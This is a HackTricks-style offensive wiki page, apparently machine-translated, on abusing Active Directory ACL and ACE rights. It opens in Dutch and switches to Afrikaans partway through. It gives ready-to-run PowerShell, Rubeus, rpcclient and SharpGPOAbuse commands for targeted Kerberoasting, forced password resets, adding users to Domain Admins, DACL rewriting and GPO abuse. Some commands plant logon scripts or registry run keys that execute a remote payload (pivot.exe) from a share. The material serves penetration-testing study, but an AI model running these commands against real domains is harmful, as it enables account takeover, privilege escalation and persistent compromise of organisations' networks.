# Misbruik van Active Directory ACLs/ACEs

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks wilt downloaden in PDF**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**officiële PEASS & HackTricks-merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Doe mee aan de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwetsbaarheden die het belangrijkst zijn, zodat je ze sneller kunt oplossen. Intruder volgt je aanvalsoppervlak, voert proactieve bedreigingsscans uit, vindt problemen in je hele technologiestack, van API's tot web-apps en cloudsystemen. [**Probeer het vandaag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Deze pagina is voornamelijk een samenvatting van de technieken van [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) en [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Voor meer details, raadpleeg de originele artikelen.**


## **GenericAll-rechten op gebruiker**
Deze rechten geven een aanvaller volledige controle over een doelgebruikersaccount. Zodra `GenericAll`-rechten zijn bevestigd met behulp van het commando `Get-ObjectAcl`, kan een aanvaller het volgende doen:

- **Het wachtwoord van het doelwit wijzigen**: Met behulp van `net user <gebruikersnaam> <wachtwoord> /domain` kan de aanvaller het wachtwoord van de gebruiker opnieuw instellen.
- **Gerichte Kerberoasting**: Ken een SPN toe aan het account van de gebruiker om het kerberoastbaar te maken, gebruik vervolgens Rubeus en targetedKerberoast.py om de ticket-granting ticket (TGT)-hashes te extraheren en te proberen te kraken.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Gerigte ASREPRoasting**: Deaktiveer vooraf-verifikasie vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Regte op Groep**
Hierdie voorreg stel 'n aanvaller in staat om groepslidmaatskappe te manipuleer as hulle `GenericAll` regte het op 'n groep soos `Domain Admins`. Nadat die onderskeidende naam van die groep geïdentifiseer is met `Get-NetGroup`, kan die aanvaller die volgende doen:

- **Voeg Hulself by die Domain Admins Groep**: Dit kan gedoen word deur direkte opdragte of deur gebruik te maak van modules soos Active Directory of PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Skryf op Rekenaar/Gebruiker**
Om hierdie bevoegdhede op 'n rekenaar- of gebruikersrekening te hê, maak die volgende moontlik:

- **Kerberos Hulpbron-gebaseerde Beperkte Delegasie**: Maak dit moontlik om 'n rekenaarrekening oor te neem.
- **Skadu-kredensiale**: Gebruik hierdie tegniek om 'n rekenaar- of gebruikersrekening na te boots deur die bevoegdhede te misbruik om skadu-kredensiale te skep.

## **WriteProperty op Groep**
As 'n gebruiker `WriteProperty`-regte het op alle voorwerpe vir 'n spesifieke groep (bv. `Domain Admins`), kan hulle die volgende doen:

- **Voeg Hulself by die Domain Admins Groep**: Hierdie metode maak dit moontlik om voorregte binne die domein te verhoog deur die `net user` en `Add-NetGroupUser` opdragte te kombineer.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Lidmaatskap) op Groep**
Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur middel van opdragte wat groepslidmaatskap direk manipuleer. Deur die volgende opdragvolgorde te gebruik, kan self-toevoeging plaasvind:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Lidmaatskap)**
'n Soortgelyke voorreg, dit stel aanvallers in staat om hulself direk by groepe te voeg deur groepseienskappe te wysig as hulle die `WriteProperty`-reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceerVeranderWagwoord**
Die behoud van die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` maak dit moontlik om wagwoorde te herstel sonder om die huidige wagwoord te weet. Verifikasie van hierdie reg en die uitbuiting daarvan kan gedoen word deur middel van PowerShell of alternatiewe opdraglyn-hulpmiddels, wat verskeie metodes bied om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en een-liners vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepings tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvektore demonstreer.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **SkryfEienaar op Groep**
As 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die groep in kwessie `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepseienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek deur middel van `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, óf deur SID óf deur naam.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**
Hierdie toestemming stel 'n aanvaller in staat om gebruikers-eienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldingskripspad van 'n gebruiker verander om 'n skadelike krips uit te voer wanneer die gebruiker aanmeld. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken-gebruiker by te werk om na die aanvaller se krips te verwys.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite op Groep**
Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrieffunksie, dit gebruik om gebruikers by 'n groep toe te voeg of te verwyder, en die lidmaatskapsveranderinge te verifieer met PowerShell-opdragte.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Om 'n AD-voorwerp te besit en `WriteDACL`-bevoegdhede daarop te hê, stel 'n aanvaller in staat om hulself `GenericAll`-bevoegdhede oor die voorwerp toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die voorwerp en die vermoë om sy groepslidmaatskappe te wysig, moontlik maak. Ten spyte hiervan bestaan beperkings wanneer daar gepoog word om hierdie bevoegdhede te misbruik met behulp van die `Set-Acl` / `Get-Acl`-cmdlets van die Active Directory-module.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikasie op die Domein (DCSync)**
Die DCSync-aanval maak gebruik van spesifieke replikasie-toestemmings op die domein om 'n Domeinbeheerder na te boots en data te sinchroniseer, insluitend gebruikerslegitimasie. Hierdie kragtige tegniek vereis toestemmings soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder.
[**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)







## GPO-delegasie <a href="#gpo-delegasie" id="gpo-delegasie"></a>

### GPO-delegasie

Gedelegeerde toegang om Groepbeleidsvoorwerpe (GPO's) te bestuur, kan aansienlike sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` gedelegeerde GPO-bestuursregte het, kan hulle voorregte soos **WriteProperty**, **WriteDacl**, en **WriteOwner** hê. Hierdie toestemmings kan misbruik word vir bose doeleindes, soos geïdentifiseer met behulp van PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Enumereer GPO-toestemmings

Om verkeerd gekonfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit maak die ontdekking van GPO's moontlik waar 'n spesifieke gebruiker toestemmings het om te bestuur:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Rekenaars met 'n Spesifieke Beleid Toegepas**: Dit is moontlik om te bepaal op watter rekenaars 'n spesifieke GPO van toepassing is, wat help om die omvang van potensiële impak te verstaan.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Beleide wat op 'n Spesifieke Rekenaar Toegepas is**: Om te sien watter beleide op 'n spesifieke rekenaar van toepassing is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OU's met 'n Spesifieke Beleid Toegepas**: Die identifisering van organisatoriese eenhede (OU's) wat deur 'n gegewe beleid geraak word, kan gedoen word met behulp van `Get-DomainOU`.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPO's kan uitgebuit word om kode uit te voer, byvoorbeeld deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geaffekteerde masjiene te voeg, wat aansienlik voorregte verhoog:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy-module - Misbruik GPO

Die GroupPolicy-module, indien geïnstalleer, maak dit moontlik om nuwe GPO's te skep en te koppel, en voorkeure soos registerwaardes in te stel om agterdeure op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker op die rekenaar aanmeld vir uitvoering:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied 'n metode om bestaande GPO's te misbruik deur take by te voeg of instellings te wysig sonder om nuwe GPO's te skep. Hierdie instrument vereis wysiging van bestaande GPO's of die gebruik van RSAT-instrumente om nuwes te skep voordat veranderinge aangebring word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Dwangbeleid Opdateer

GPO-opdates vind gewoonlik elke 90 minute plaas. Om hierdie proses te versnel, veral nadat 'n verandering geïmplementeer is, kan die `gpupdate /force`-opdrag gebruik word op die teikerekenaar om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO's toegepas word sonder om te wag vir die volgende outomatiese opdate-siklus.

### Onder die Oppervlak

By inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur middel van skripte of opdraglynhulpmiddels wat daarop gemik is om stelselgedrag te wysig of bevoegdhede te verhoog.

Die struktuur van die taak, soos weergegee in die XML-konfigurasie-lêer wat gegenereer word deur `New-GPOImmediateTask`, skets die spesifieke van die geskeduleerde taak - insluitend die opdrag wat uitgevoer moet word en sy trefpunte. Hierdie lêer verteenwoordig hoe geskeduleerde take gedefinieer en bestuur word binne GPO's, en bied 'n metode om willekeurige opdragte of skripte uit te voer as deel van beleidsafdwinging.

### Gebruikers en Groepe

GPO's maak ook die manipulasie van gebruikers- en groepslidmaatskappe op teikensisteme moontlik. Deur die Gebruikers en Groepe-beleidslêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe, soos die plaaslike `administrators`-groep, voeg. Dit is moontlik deur die delegasie van GPO-bestuursbevoegdhede, wat die wysiging van beleidslêers toelaat om nuwe gebruikers by te sluit of groepslidmaatskappe te verander.

Die XML-konfigurasie-lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde bevoegdhede oor die betrokke stelsels verkry. Hierdie metode bied 'n direkte benadering tot bevoorregte eskalasie deur middel van GPO-manipulasie.

Verder kan aanvullende metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmelding/afmelding-skripte, die wysiging van registerleiers vir outomatiese uitvoering, die installeer van sagteware via .msi-lêers, of die wysiging van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en te beheer oor teikensisteme deur die misbruik van GPO's.

## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder hou jou aanvalsoppervlak dop, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegniese stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
